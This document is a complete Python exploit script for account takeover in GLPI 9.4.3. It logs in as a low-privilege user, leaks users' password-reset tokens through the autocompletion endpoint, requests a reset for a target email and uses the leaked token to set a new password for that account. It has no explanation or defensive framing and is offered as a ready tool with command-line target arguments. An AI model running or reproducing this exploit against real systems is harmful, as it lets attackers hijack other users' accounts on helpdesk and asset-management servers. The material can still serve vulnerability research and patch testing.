#!/usr/bin/python
#
#
import re
import sys
import json
import argparse
import requests
class GlpiBrowser:
    def __init__(self, url, user, password):
        self.url = url
        self.user = user
        self.password = password
        
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
    
    
    def extract_csrf(self, html):
        return re.findall('name="_glpi_csrf_token" value="([a-f0-9]{32})"', html)[0]
    
    def get_login_data(self):
        r = self.session.get('{0}'.format(self.url), allow_redirects=True)
        
        csrf_token = self.extract_csrf(r.text)
        name_field = re.findall('name="(.*)" id="login_name"', r.text)[0]
        pass_field = re.findall('name="(.*)" id="login_password"', r.text)[0]
        
        return name_field, pass_field, csrf_token
    
    
    def login(self):
        try:
            name_field, pass_field, csrf_token = self.get_login_data()
        except Exception as e:
            print ("[-] Login error: could not retrieve form data")
            sys.exit(1)
        
        data = {
            name_field: self.user, 
            pass_field: self.password,
            "auth": "local",
            "submit": "Post",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/login.php'.format(self.url), data=data, allow_redirects=False)
        
        return r.status_code == 302
    
    
    def get_data(self, itemtype, field, term=None):        
        params = {
            "itemtype": itemtype,
            "field": field,
            "term": term if term else ""
        }
        
        r = self.session.get('{}/ajax/autocompletion.php'.format(self.url), params=params)
        
        if r.status_code == 200:
            try:
                data = json.loads(r.text)
            except:
                return None
            return data
        return None
        
    
    def get_forget_token(self):
        return self.get_data('User', 'password_forget_token')
    
    
    def get_emails(self):
        return self.get_data('UserEmail', 'email')
    
    
    def lost_password_request(self, email):
        r = self.session.get('{0}/front/lostpassword.php'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print ("[-] Lost password error: could not retrieve form data")
            sys.exit(1)
        
        data = {
            "email": email,
            "update": "Save",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/lostpassword.php'.format(self.url), data=data)
        return 'An email has been sent' in r.text
    
    
    def change_password(self, email, password, token):
        r = self.session.get('{0}/front/lostpassword.php'.format(self.url), params={'password_forget_token': token})
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print ("[-] Change password error: could not retrieve form data")
            sys.exit(1)
        
        data = {
            "email": email,
            "password": password,
            "password2": password,
            "password_forget_token": token,
            "update": "Save",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/lostpassword.php'.format(self.url), data=data)
        return 'Reset password successful' in r.text
    
    
    def pwn(self, email, password):
        
        if not self.login():
            print ("[-] Login error")
            return
        
        tokens = self.get_forget_token()
        if tokens is None:
            tokens = []
        
        if email:
            if not self.lost_password_request(email):
                print ("[-] Lost password error: could not request")
                return
            
            new_tokens = self.get_forget_token()
            
            res = list(set(new_tokens) - set(tokens))
            if res:
                for token in res:
                    if self.change_password(email, password, token):
                        print ("[+] Password changed! ;")
                        return
        
        
        
if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description='GLPI-9.4.3-Account-Takeover Script')
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--user", help="Username", required=True)
    parser.add_argument("--password", help="Password", required=True)
    parser.add_argument("--email", help="Target email")
    parser.add_argument("--newpass", help="New password")
    
    args = parser.parse_args()
    
    g = GlpiBrowser(args.url, user=args.user, password=args.password)

    g.pwn(args.email, args.newpass)
